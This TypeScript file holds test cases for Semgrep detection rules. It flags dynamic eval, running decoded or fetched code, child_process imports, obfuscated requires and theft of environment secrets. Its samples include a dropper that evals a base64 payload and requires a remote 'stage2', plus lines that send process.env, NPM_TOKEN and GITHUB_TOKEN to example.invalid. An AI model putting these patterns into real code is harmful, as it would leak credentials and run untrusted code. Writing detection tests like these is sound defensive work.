// Test cases for js.yaml. Harmless samples: nothing here is executed.
// `ruleid:` lines must match, `ok:` lines must not.

import * as vm from 'node:vm';

// --- js-dynamic-code-execution ---------------------------------------------

function dynamic(code: string) {
  // ruleid: js-dynamic-code-execution
  eval(code);
  // ruleid: js-dynamic-code-execution
  const f = new Function('a', code);
  // ruleid: js-dynamic-code-execution
  vm.runInNewContext(code, {});
  // ruleid: js-dynamic-code-execution
  setTimeout("doThing()", 10);
  // ok: js-dynamic-code-execution
  setTimeout(() => f(1), 10);
  // ok: js-dynamic-code-execution
  const fn: Function = f;
  return fn;
}

// --- js-decoded-or-remote-code-execution -----------------------------------

async function dropper(blob: string) {
  const payload = Buffer.from(blob, 'base64').toString();
  // ruleid: js-decoded-or-remote-code-execution, js-dynamic-code-execution
  eval(payload);

  const res = await fetch('https://example.invalid/stage2');
  const body = await res.text();
  // ruleid: js-decoded-or-remote-code-execution
  require(body);

  const cmd = String.fromCharCode(108, 115);
  // ruleid: js-decoded-or-remote-code-execution
  execSync(cmd);

  // ok: js-decoded-or-remote-code-execution
  const json = JSON.parse(Buffer.from(blob, 'base64').toString());
  return json;
}

// --- js-child-process -------------------------------------------------------

// ruleid: js-child-process
import { execSync } from 'node:child_process';
// ruleid: js-child-process
const cp = require('child_process');
// ok: js-child-process
import { readFileSync } from 'node:fs';

// --- js-string-built-require -----------------------------------------------

function loader(name: string) {
  // Semgrep folds the constant, so the child_process rule sees through it too.
  // ruleid: js-string-built-require, js-child-process
  require('child_' + 'process');
  // ruleid: js-string-built-require
  require(`./plugins/${name}`);
  // ruleid: js-string-built-require
  require(['s', 's', 'e', 'c', 'o', 'r', 'p'].reverse().join(''));
  // ok: js-string-built-require
  require('./config');
}

// --- js-environment-exfiltration -------------------------------------------

async function exfiltrate() {
  // ruleid: js-environment-exfiltration
  await fetch('https://example.invalid/collect', { method: 'POST', body: JSON.stringify(process.env) });

  const token = process.env.NPM_TOKEN;
  // ruleid: js-environment-exfiltration
  await fetch(`https://example.invalid/?t=${token}`);

  // ruleid: js-environment-exfiltration
  await axios.post('https://example.invalid/', { k: process.env.GITHUB_TOKEN });

  // ok: js-environment-exfiltration
  await fetch(process.env.FACILITATOR_URL ?? 'https://channels.openzeppelin.com/x402/testnet');

  // A key sent in a header to the service it belongs to is ordinary.
  // ok: js-environment-exfiltration
  await fetch('https://channels.openzeppelin.com/x402/testnet/verify', {
    method: 'POST',
    headers: { Authorization: `Bearer ${process.env.OZ_API_KEY}` },
    body: JSON.stringify({ amount: '1000' }),
  });
}

declare const axios: { post(url: string, data: unknown): Promise<unknown> };
export { dynamic, dropper, loader, exfiltrate, cp, readFileSync };
